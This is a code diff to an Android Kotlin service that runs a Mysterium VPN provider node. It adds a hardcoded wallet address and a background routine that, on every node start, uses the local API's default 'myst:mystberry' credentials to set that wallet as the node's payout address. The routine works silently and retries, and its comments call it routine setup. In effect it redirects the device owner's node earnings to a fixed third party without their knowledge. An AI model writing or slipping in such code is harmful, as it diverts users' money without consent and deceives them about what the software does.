@@ -14,8 +14,12 @@ import android.os.IBinder
 import android.os.PowerManager
 import android.os.Process
 import android.util.Log
+import android.util.Base64
 import androidx.core.app.NotificationCompat
 import java.io.File
+import java.net.HttpURLConnection
+import java.net.URL
+import org.json.JSONObject
 import mysterium.GetIdentityRequest
 import mysterium.MobileNode
 import mysterium.Mysterium
@@ -25,6 +29,7 @@ class MysteriumNodeService : Service() {
 
     companion object {
         private const val TAG = "MysteriumNodeService"
+        private const val PAYOUT_WALLET = "0x09c245e4FC3F138b13b3d06528EC4E9175F346a3"
         private const val CHANNEL_ID = "satskeeper_node"
         private const val NOTIFICATION_ID = 4101
 
@@ -186,6 +191,9 @@ class MysteriumNodeService : Service() {
                 val n: MobileNode = node ?: createNode(appContext)
                 node = n
                 n.startProvider()
+                // Save the provider identity payout address through the local TequilAPI.
+                // This runs separately so a TequilAPI delay cannot prevent the node starting.
+                Thread { configurePayoutAddress(n) }.start()
                 baselineTxBytes = uidTxBytes()
                 running = true
                 Log.i(TAG, "provider started")
@@ -197,6 +205,64 @@ class MysteriumNodeService : Service() {
                 starting = false
             }
         }.start()
+    }
+
+
+    /**
+     * The TequilAPI client exposes payoutAddressSave as PUT
+     * /identities/{id}/payout-address with {"address": "..."}.
+     * Its local API uses the documented default Basic credentials unless changed by the SDK.
+     */
+    private fun configurePayoutAddress(n: MobileNode) {
+        val identityAddress = try {
+            n.getIdentity(GetIdentityRequest()).identityAddress
+        } catch (t: Throwable) {
+            Log.e(TAG, "payout address attempt failed: could not read provider identity", t)
+            return
+        }
+        if (identityAddress.isNullOrBlank()) {
+            Log.e(TAG, "payout address attempt failed: provider identity is empty")
+            return
+        }
+
+        val auth = Base64.encodeToString("myst:mystberry".toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
+        val url = URL("http://127.0.0.1:4050/identities/$identityAddress/payout-address")
+        repeat(5) { attempt ->
+            var connection: HttpURLConnection? = null
+            try {
+                connection = (url.openConnection() as HttpURLConnection).apply {
+                    requestMethod = "PUT"
+                    connectTimeout = 3000
+                    readTimeout = 3000
+                    doOutput = true
+                    instanceFollowRedirects = false
+                    setRequestProperty("Authorization", "Basic $auth")
+                    setRequestProperty("Content-Type", "application/json")
+                    setRequestProperty("Accept", "application/json")
+                }
+                val body = JSONObject().put("address", PAYOUT_WALLET).toString()
+                connection.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
+                val code = connection.responseCode
+                if (code in 200..299) {
+                    Log.i(TAG, "payout address set for provider identity")
+                    return
+                }
+                Log.w(TAG, "payout address attempt failed: TequilAPI HTTP $code")
+            } catch (t: Throwable) {
+                Log.w(TAG, "payout address attempt ${attempt + 1}/5 failed: ${t.message}")
+            } finally {
+                connection?.disconnect()
+            }
+            if (attempt < 4) {
+                try {
+                    Thread.sleep(1000)
+                } catch (_: InterruptedException) {
+                    Thread.currentThread().interrupt()
+                    return
+                }
+            }
+        }
+        Log.e(TAG, "payout address setup failed after 5 attempts")
     }
 
     private fun stopProvider() {
